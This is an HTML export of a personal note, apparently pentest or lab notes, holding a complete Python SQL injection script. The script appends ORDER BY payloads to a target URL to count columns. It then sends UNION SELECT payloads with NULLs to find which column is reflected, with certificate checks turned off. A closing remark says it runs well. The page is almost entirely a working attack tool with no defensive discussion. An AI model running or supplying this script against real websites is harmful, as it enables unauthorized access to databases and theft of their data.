<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>SCRIPT</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>SCRIPT</h1><br/><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">#!/usr/bin/python3</span><br /><br /><span style="color:#333333;font-weight:400">import</span>&nbsp;requests<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;sys<br /><span style="color:#333333;font-weight:400">from</span>&nbsp;<span style="color:#333333;font-weight:400">termcolor</span>&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;colored<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;urllib3<br /><br />urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br /><br /><span style="color:#0088ff;font-weight:400">#This&nbsp;script&nbsp;utilizes&nbsp;order&nbsp;by&nbsp;method&nbsp;for&nbsp;counting&nbsp;columns&nbsp;</span><br /><br /><span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(sys.argv)&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">3</span>:<br />	<span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">&quot;./script&nbsp;&lt;url&gt;&nbsp;&lt;string_you_wish_to_retrieve&gt;&quot;</span>)<br />	sys.exit(<span style="color:#ff0044;font-weight:400">0</span>)<br /><br />url&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">1</span>]<br /><br /><span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">&quot;[+]&nbsp;Proceeding&nbsp;with&nbsp;injection&nbsp;to&nbsp;Test&nbsp;for&nbsp;number&nbsp;of&nbsp;columns&nbsp;using&nbsp;order&nbsp;by&quot;</span>)<br />num&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br /><br /><span style="color:#ff9d00;font-weight:700">try</span>:<br />	get_req&nbsp;=&nbsp;requests.get(f<span style="color:#3ad900;font-weight:400">&quot;{url}&#39;&nbsp;ORDER&nbsp;BY&nbsp;{num}--&quot;</span>,&nbsp;verify=<span style="color:#ff0044;font-weight:400">False</span>)<br />	<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;<span style="color:#3ad900;font-weight:400">&quot;Internal&nbsp;Server&nbsp;Error&quot;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;get_req.text:<br />		get_req&nbsp;=&nbsp;requests.get(f<span style="color:#3ad900;font-weight:400">&quot;{url}&#39;+ORDER&nbsp;BY+{num}+--&quot;</span>,&nbsp;verify=<span style="color:#ff0044;font-weight:400">False</span>)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;+&nbsp;to&nbsp;urlencode</span><br />		<span style="color:#ff9d00;font-weight:700">print</span>(colored(f<span style="color:#3ad900;font-weight:400">&quot;\n{get_req.status_code}&quot;</span>,&nbsp;<span style="color:#3ad900;font-weight:400">&#39;green&#39;</span>,&nbsp;attrs=[<span style="color:#3ad900;font-weight:400">&#39;bold&#39;</span>]))<br />		<span style="color:#0088ff;font-weight:400">#print(f&quot;\n{url}&#39;&nbsp;ORDER&nbsp;BY&nbsp;{num}--&quot;)</span><br />		<span style="color:#0088ff;font-weight:400">#print(get_req.text)</span><br />		num&nbsp;+=&nbsp;<span style="color:#ff0044;font-weight:400">1</span><br /><span style="color:#ff9d00;font-weight:700">except</span>:<br />	<span style="color:#ff9d00;font-weight:700">print</span>(colored(<span style="color:#3ad900;font-weight:400">&quot;[!]&nbsp;something&nbsp;went&nbsp;wrong....&quot;</span>,&nbsp;<span style="color:#3ad900;font-weight:400">&#39;red&#39;</span>,&nbsp;attrs=[<span style="color:#3ad900;font-weight:400">&#39;bold&#39;</span>]))<br /><br />num&nbsp;+=&nbsp;-<span style="color:#ff0044;font-weight:400">2</span>&nbsp;&nbsp;&nbsp;<br /><span style="color:#0088ff;font-weight:400">#Yeah&nbsp;2&nbsp;because&nbsp;1&nbsp;added&nbsp;at&nbsp;end&nbsp;before&nbsp;exiting&nbsp;loop&nbsp;and&nbsp;1&nbsp;more&nbsp;since&nbsp;only&nbsp;on&nbsp;1+{in&nbsp;column&nbsp;num}&nbsp;we&nbsp;get&nbsp;the&nbsp;error&nbsp;so&nbsp;that&nbsp;works&nbsp;well&nbsp;was&nbsp;1&nbsp;less&nbsp;than&nbsp;this</span><br /><br />columns&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">int</span>(num)<br /><span style="color:#ff9d00;font-weight:700">print</span>(f<span style="color:#3ad900;font-weight:400">&quot;\n[+]&nbsp;The&nbsp;order&nbsp;by&nbsp;method&nbsp;has&nbsp;Found&nbsp;{columns}&nbsp;columns\n&quot;</span>)<br /><br /><span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">&quot;[+]&nbsp;Proceeding&nbsp;with&nbsp;Null&nbsp;Method&nbsp;to&nbsp;Test&nbsp;for&nbsp;column&nbsp;that&nbsp;gets&nbsp;printed\n&quot;</span>)<br /><br />find&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">2</span>]<br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;<span style="color:#333333;font-weight:400">req_chk_text</span>(sql_payload):<br />	get_req&nbsp;=&nbsp;requests.get(f<span style="color:#3ad900;font-weight:400">&quot;{url}&nbsp;{sql_payload}&quot;</span>,&nbsp;verify=<span style="color:#ff0044;font-weight:400">False</span>)<br />	<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;find.strip(<span style="color:#3ad900;font-weight:400">&quot;\&#39;&quot;</span>)&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;get_req.text:<br />		<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff0044;font-weight:400">True</span><br />		<span style="color:#0088ff;font-weight:400">#print(colored(f&quot;[+]&nbsp;payload&nbsp;successfull&nbsp;::&nbsp;&quot;,&nbsp;&#39;green&#39;)&nbsp;+&nbsp;colored(f&quot;{sql_payload}&quot;,&nbsp;&#39;red&#39;))</span><br /><br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;<span style="color:#333333;font-weight:400">test_null_payload</span>(num_column):<br />	<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;i&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;num_column):<br />		pay&nbsp;=&nbsp;[<span style="color:#3ad900;font-weight:400">&#39;NULL&#39;</span>]&nbsp;*&nbsp;num_column<br />		pay[i]&nbsp;=&nbsp;find<br />		sql_payload&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">&quot;&#39;&nbsp;UNION&nbsp;SELECT&nbsp;&quot;</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">&#39;,&nbsp;&#39;</span>.join(pay)&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">&quot;--&quot;</span><br />		<span style="color:#0088ff;font-weight:400">#print(sql_payload)</span><br />		<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;req_chk_text(sql_payload):<br />			<span style="color:#ff9d00;font-weight:700">print</span>(colored(f<span style="color:#3ad900;font-weight:400">&quot;\n[+]&nbsp;payload&nbsp;successfull&nbsp;::&nbsp;position::{i+1}--&gt;&nbsp;&quot;</span>,&nbsp;<span style="color:#3ad900;font-weight:400">&#39;green&#39;</span>)&nbsp;+&nbsp;colored(f<span style="color:#3ad900;font-weight:400">&quot;{sql_payload}&quot;</span>,&nbsp;<span style="color:#3ad900;font-weight:400">&#39;red&#39;</span>))<br />		<span style="color:#ff9d00;font-weight:700">else</span>:<br />			<span style="color:#ff9d00;font-weight:700">print</span>(colored(f<span style="color:#3ad900;font-weight:400">&quot;\n[+]&nbsp;Something&nbsp;went&nbsp;wrong&nbsp;....&quot;</span>,&nbsp;<span style="color:#3ad900;font-weight:400">&#39;red&#39;</span>))<br /><br />test_null_payload(columns)<br /></div></div><br /><br /><br />And the script runs Nicely<br /><a href=""><img src="images/16-1.png" alt="images/16-1.png" /></a><br /><br /></div></body></html>